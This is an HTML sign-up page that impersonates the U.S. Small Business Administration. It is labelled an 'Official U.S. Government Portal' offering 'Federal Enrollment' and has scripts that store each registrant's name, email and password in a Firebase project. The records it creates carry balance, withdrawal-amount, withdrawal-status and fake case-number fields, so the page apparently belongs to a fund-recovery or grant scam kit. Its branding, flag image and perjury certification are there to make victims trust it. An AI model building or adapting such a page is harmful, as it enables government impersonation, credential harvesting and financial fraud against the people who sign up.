<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SBA Portal | Case Enrollment</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;700;900&display=swap');
        :root { --sba-blue: #002e6d; --sba-red: #cc0000; }
        body { font-family: 'Public Sans', sans-serif; background-color: #f8fafc; -webkit-tap-highlight-color: transparent; }
        
        .gov-top { background: #f0f0f0; color: #444; font-size: 10px; padding: 8px 20px; border-bottom: 1px solid #ddd; font-weight: 700; }
        .sba-logo-box { position: relative; display: inline-block; padding: 4px 8px; }
        .sba-logo-box::before { content: ""; position: absolute; top: 0; left: 0; right: 0; bottom: 5px; border-top: 3px solid var(--sba-blue); border-left: 3px solid var(--sba-blue); border-right: 3px solid var(--sba-blue); }
        .sba-logo-box::after { content: ""; position: absolute; bottom: 0; left: 0; right: 30%; height: 3px; background: var(--sba-red); }

        .auth-card { border-radius: 4px; border-top: 6px solid var(--sba-blue); box-shadow: 0 15px 30px rgba(0,0,0,0.08); }
        .btn-sba { background-color: var(--sba-blue); border-bottom: 4px solid #001a3d; transition: all 0.1s; }
        .btn-sba:active { transform: translateY(2px); border-bottom-width: 0; }
        
        input { font-size: 16px !important; } /* Prevents iOS zoom on focus */
    </style>
</head>
<body class="min-h-screen flex flex-col">

    <div class="gov-top flex items-center gap-2 uppercase tracking-tight">
        <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" class="w-4" alt="US Flag">
        <span>Official U.S. Government Portal</span>
    </div>

    <header class="bg-white border-b border-gray-200 py-5 px-6 flex justify-center shadow-sm">
        <div class="flex items-center gap-3">
            <div class="sba-logo-box">
                <span class="text-xl font-black text-[#002e6d] tracking-tighter">SBA</span>
            </div>
            <div class="text-left">
                <p class="text-[8px] font-black text-slate-400 uppercase leading-none mb-0.5">U.S. Small Business</p>
                <p class="text-[10px] font-black text-[#002e6d] uppercase leading-none">Administration</p>
            </div>
        </div>
    </header>

    <main class="flex-grow flex items-center justify-center p-5">
        <div class="w-full max-w-md">
            <div class="bg-white auth-card p-8 border border-gray-200">
                
                <div class="mb-8 text-center">
                    <h2 class="text-2xl font-black text-slate-800 uppercase tracking-tighter">Initialize Case</h2>
                    <p class="text-slate-400 text-[10px] font-bold uppercase tracking-[0.2em] mt-1">Federal Enrollment Protocol</p>
                </div>

                <div id="alertBox" class="hidden mb-6 p-4 rounded-sm bg-red-50 border-l-4 border-red-600 text-red-700 text-[11px] font-bold italic uppercase leading-tight"></div>

                <form id="registerForm" class="space-y-5">
                    <div>
                        <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-2">Legal Full Name</label>
                        <div class="relative">
                            <span class="absolute inset-y-0 left-0 pl-4 flex items-center text-slate-400">
                                <i class="fas fa-id-card"></i>
                            </span>
                            <input type="text" id="userName" required class="w-full pl-11 pr-4 py-4 bg-slate-50 border border-slate-200 rounded-sm outline-none focus:border-[#002e6d] focus:bg-white font-semibold text-sm transition-all" placeholder="As shown on ID">
                        </div>
                    </div>

                    <div>
                        <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-2">Contact Email</label>
                        <div class="relative">
                            <span class="absolute inset-y-0 left-0 pl-4 flex items-center text-slate-400">
                                <i class="fas fa-envelope"></i>
                            </span>
                            <input type="email" id="userEmail" required class="w-full pl-11 pr-4 py-4 bg-slate-50 border border-slate-200 rounded-sm outline-none focus:border-[#002e6d] focus:bg-white font-semibold text-sm transition-all" placeholder="email@example.com">
                        </div>
                    </div>

                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
                        <div>
                            <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-2">Set Passkey</label>
                            <input type="password" id="userPass" required class="w-full px-4 py-4 bg-slate-50 border border-slate-200 rounded-sm outline-none focus:border-[#002e6d] focus:bg-white font-semibold text-sm transition-all" placeholder="••••••••">
                        </div>
                        <div>
                            <label class="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-2">Confirm</label>
                            <input type="password" id="confirmPass" required class="w-full px-4 py-4 bg-slate-50 border border-slate-200 rounded-sm outline-none focus:border-[#002e6d] focus:bg-white font-semibold text-sm transition-all" placeholder="••••••••">
                        </div>
                    </div>

                    <div class="flex items-start gap-3 p-4 bg-slate-50 border border-slate-200 rounded-sm">
                        <input type="checkbox" id="termsCheck" required class="mt-1 w-5 h-5 accent-[#002e6d] cursor-pointer">
                        <label for="termsCheck" class="text-[9px] text-slate-500 font-bold italic uppercase leading-tight">
                            I certify that the information provided is accurate under penalty of perjury & agree to the <a href="terms.html" class="text-blue-800 underline">Federal Disclosure Agreement</a>.
                        </label>
                    </div>

                    <button type="submit" id="submitBtn" class="btn-sba w-full text-white font-black py-5 rounded-sm shadow-lg uppercase tracking-[0.2em] text-xs mt-2">
                        Create Case File
                    </button>
                </form>

                <div class="mt-8 pt-6 border-t border-slate-100 text-center">
                    <p class="text-[10px] text-slate-400 font-bold uppercase mb-2">Already Enrolled?</p>
                    <a href="login.html" class="text-[#002e6d] font-black text-[11px] uppercase tracking-widest hover:underline transition-all">
                        Secure Portal Login
                    </a>
                </div>
            </div>
        </div>
    </main>

    <footer class="py-6 text-center text-[9px] text-slate-400 font-bold uppercase tracking-widest">
        SECURE NODE ACCESS | FEDERAL ENROLLMENT
    </footer>

    <script type="module">
        import { auth, db } from './firebase-config.js';
        import { createUserWithEmailAndPassword, sendEmailVerification } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { doc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const regForm = document.getElementById('registerForm');
        const alertBox = document.getElementById('alertBox');
        const btn = document.getElementById('submitBtn');

        regForm.onsubmit = async (e) => {
            e.preventDefault();
            alertBox.classList.add('hidden');

            const name = document.getElementById('userName').value.trim();
            const email = document.getElementById('userEmail').value.toLowerCase().trim();
            const pass = document.getElementById('userPass').value;
            const confirm = document.getElementById('confirmPass').value;

            // 1. Logic Validations
            if (pass.length < 6) return showAlert("SECURITY: Passkey must be at least 6 characters.");
            if (pass !== confirm) return showAlert("SYNC ERROR: Passkeys do not match.");

            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> PROVISIONING...';

            try {
                // 2. Auth User Creation
                const userCredential = await createUserWithEmailAndPassword(auth, email, pass);
                const user = userCredential.user;

                // 3. Send Email Verification
                await sendEmailVerification(user);

                // 4. Save to Firestore
                await setDoc(doc(db, "users", user.uid), {
                    uid: user.uid,
                    fullName: name,
                    email: email,
                    balance: 0,
                    withdrawAmount: 0,
                    withdrawStatus: "NONE",
                    caseNumber: "SBA-" + Math.floor(100000 + Math.random() * 900000),
                    createdAt: new Date().toISOString()
                });

                // 5. Flow: Straight to verify.html
                window.location.href = "verify.html";

            } catch (error) {
                btn.disabled = false;
                btn.innerText = "Create Case File";
                if (error.code === 'auth/email-already-in-use') {
                    showAlert("SYSTEM ERROR: Email already registered.");
                } else {
                    showAlert("SYSTEM ERROR: " + error.message);
                }
            }
        };

        function showAlert(msg) {
            alertBox.innerText = msg;
            alertBox.classList.remove('hidden');
            window.scrollTo(0, 0);
        }
    </script>
</body>
</html>
